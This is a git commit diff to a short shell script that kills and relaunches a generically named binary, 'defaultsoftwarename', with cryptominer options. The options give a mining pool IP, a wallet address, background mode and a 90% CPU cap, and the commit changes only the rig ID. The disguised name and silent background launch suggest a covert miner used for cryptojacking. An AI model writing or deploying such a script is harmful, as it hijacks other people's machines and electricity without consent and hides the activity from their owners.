20d84c4d345df83130256f973397912ededa7170
snupsnep <69668425+snupsnep@users.noreply.github.com>
2020-08-14 14:24:22 +0300

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 94.103.85.146:37612 -u 877XVG45BVjYqd5j8BpixVTKGDn881BiXhAc5b7CCHqc5xLJZ7ivrtgPoSGBhJGBbyWFUjbUKB6UUZ6EmLQnjykgQMAwXKi --pass=x:snupsnepp@yandex.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 94.103.85.146:37612 -u 877XVG45BVjYqd5j8BpixVTKGDn881BiXhAc5b7CCHqc5xLJZ7ivrtgPoSGBhJGBbyWFUjbUKB6UUZ6EmLQnjykgQMAwXKi --pass=x:snupsnepp@yandex.ru --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
